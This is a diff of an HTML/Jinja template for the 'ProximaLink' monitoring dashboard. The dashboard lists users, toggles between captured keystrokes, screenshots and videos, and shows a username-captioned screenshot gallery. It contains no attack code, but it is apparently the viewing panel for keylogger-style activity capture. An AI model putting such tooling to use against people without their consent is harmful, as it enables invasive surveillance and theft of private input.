@@ -16,7 +16,6 @@
       href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap"
       rel="stylesheet"
     />
-
     <link
       rel="stylesheet"
       href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
@@ -25,15 +24,27 @@
       rel="stylesheet"
       href="{{ url_for('static', filename='styles.css') }}"
     />
+   
   </head>
-  <body class="bg-dark text-white">
-    <header class="bg-primary text-white text-center py-3">
-      <h1>ProximaLink Dashboard</h1>
-      <p>Welcome to the monitoring dashboard.</p>
+  <body>
+    <header class="flex-fill align-self-center">
+      <div class="container-fluid flex-fill align-items-center">
+        <div class="flex-grow-1 logo">
+          <img
+            src="/static/icons/PureWhite.png"
+            class="img-fluid"
+            alt="logo-white"
+          />
+        </div>
+        <div class="header-content flex-fill">
+          <h1>ProximaLink Dashboard</h1>
+          <p>Welcome to the monitoring dashboard.</p>
+        </div>
+      </div>
     </header>
+
     <div class="container-fluid">
       <div class="row">
-        <!-- Aside Section -->
         <aside class="col-md-2 py-3">
           <h2>Users</h2>
           <ul class="list-unstyled">
@@ -45,145 +56,100 @@
           </ul>
         </aside>
 
-        <!-- Main Section -->
         <main class="col-md-10">
-          <div class="row mb-3">
-            <div class="col">
+          <div class="d-flex justify-content-between align-self-center">
+            <div class="col-btn">
               <!-- Buttons Section -->
               <div
-                class="btn-group mb-2"
+                class="btn-group d-flex align-items-start"
                 role="group"
                 aria-label="Toggle Buttons"
               >
                 <button
                   type="button"
-                  class="btn btn-primary"
+                  class="btn rounded-pill btn-primary mx-2"
                   id="btnKeystrokes"
+                  data-toggle="button" 
+                  aria-pressed="false"
                 >
                   Keystrokes
-                </button>
+
+            </button>
+                <button
+                  class="btn rounded-pill btn-outline-primary active mx-2"
+                  id="btnScreenshots"
+                  data-toggle="button" 
+                  aria-pressed="false"
+                  >
+
+                  Screenshots
+
                 <button
                   type="button"
-                  class="btn btn-primary"
-                  id="btnScreenshots"
+                  class="btn rounded-pill btn-outline-primary mx-2"
+                  id="btnVideos"
+                  data-toggle="button" 
+                  aria-pressed="false"
                 >
-                  Screenshots
-                </button>
-                <button type="button" class="btn btn-primary" id="btnVideos">
                   Videos
                 </button>
               </div>
             </div>
           </div>
 
-          <!-- Content Sections -->
-          <div class="row">
-            <div class="col">
-              <!-- Keystrokes Section -->
-              {% if all_logs %}
-              {% for log in all_logs %}
-              <div class="log-entry border rounded mb-3">
-                <p>{{ log.text }}</p>
-                <p class="timestamp text-left">{{ log.timestamp }}</p>
-              </div>
-              {% endfor %} {% else %}
-                <div class="alert alert-info text-center" role="alert">
-                  No keystrokes found.
-                </div>
-                {% endif %}
-              </div>
-            </div>
-
-              <!-- Screenshots Section -->
-              <div
-                id="sectionScreenshots"
-                class="content-section"
-                style="display: none"
-              >
-                {% if screenshots %} {% for screenshot in screenshots %}
-                <div class="screenshot-entry mb-3">
-                  <img
-                    src="{{ screenshot.url }}"
-                    alt="Screenshot"
-                    class="img-fluid"
-                  />
-                  <p class="timestamp text-left">{{ screenshot.timestamp }}</p>
-                </div>
-                {% endfor %} {% else %}
-                <div class="alert alert-info text-center" role="alert">
-                  No screenshots found.
-                </div>
-                {% endif %}
-              </div>
-
-              <!-- Videos Section -->
-              <div
-                id="sectionVideos"
-                class="content-section"
-                style="display: none"
-              >
-                {% if videos %} {% for video in videos %}
-                <div class="video-entry mb-3">
-                  <video controls>
-                    <source src="{{ video.url }}" type="video/mp4" />
-                    Your browser does not support the video tag.
-                  </video>
-                  <p class="timestamp text-left">{{ video.timestamp }}</p>
-                </div>
-                {% endfor %} {% else %}
-                <div class="alert alert-info text-center" role="alert">
-                  No videos found.
-                </div>
-                {% endif %}
-              </div>
-            </div>
+          <!-- Vertical Separator -->
+          <div class="col-1 separator">
+            <hr class="my-3" />
           </div>
-        </main>
+
+          <div class="screenshots-container">
+  {% for screenshot in screenshots %}
+  <div class="screenshot-item">
+    <img
+      src="http://localhost:8000/{{ screenshot.filename }}"
+      alt="Screenshot"
+      class="screenshot-thumbnail"
+      data-image="http://localhost:8000/{{ screenshot.filename }}"
+      data-toggle="modal"
+      data-target="#overlayModal"
+      data-caption="Username: {{ screenshot.username }}"
+    />
+  </div>
+  {% endfor %}
+</div>
+
+<!-- Modal for overlay view -->
+<div class="modal fade" id="overlayModal" tabindex="-1" role="dialog" aria-labelledby="overlayModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-body">
+        <button type="button" class="close nav-btn-top-right" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+        <button class="nav-btn nav-btn-left" id="prevImage">&lt;</button>
+        <button class="nav-btn nav-btn-right" id="nextImage">&gt;</button>
+        <img src="" class="img-fluid" id="overlayImage" />
+      </div>
+      <div class="modal-footer justify-content-center">
+        <div class="nav-dots" id="navDots"></div>
       </div>
     </div>
+  </div>
+</div>
 
-    <footer class="bg-primary text-white text-center py-3 mt-3">
+
+</main>
+
+
+    <footer style="margin-top: 15px">
       <p>ProximaLink Monitoring &copy; 2024</p>
     </footer>
-    <div
-      class="modal fade"
-      id="overlayModal"
-      tabindex="-1"
-      role="dialog"
-      aria-labelledby="overlayModalLabel"
-      aria-hidden="true"
-    >
-      <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
-        <div class="modal-content bg-dark">
-          <div class="modal-header">
-            <h5 class="modal-title" id="overlayModalLabel">Screenshot</h5>
-            <button
-              type="button"
-              class="close"
-              data-dismiss="modal"
-              aria-label="Close"
-            >
-              <span aria-hidden="true">&times;</span>
-            </button>
-          </div>
-          <div class="modal-body">
-            <img id="overlayImage" src="" alt="Screenshot" class="img-fluid" />
-          </div>
-          <div class="modal-footer">
-            <button
-              type="button"
-              class="btn btn-secondary"
-              data-dismiss="modal"
-            >
-              Close
-            </button>
-          </div>
-        </div>
-      </div>
-    </div>
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+
+    <!-- JavaScript Libraries -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-    <script src="{{ url_for('static', filename='scripts.js') }}"></script>
+    <script src="{{url_for('static', filename="screenshot.js")}}">
+</script>
   </body>
 </html>
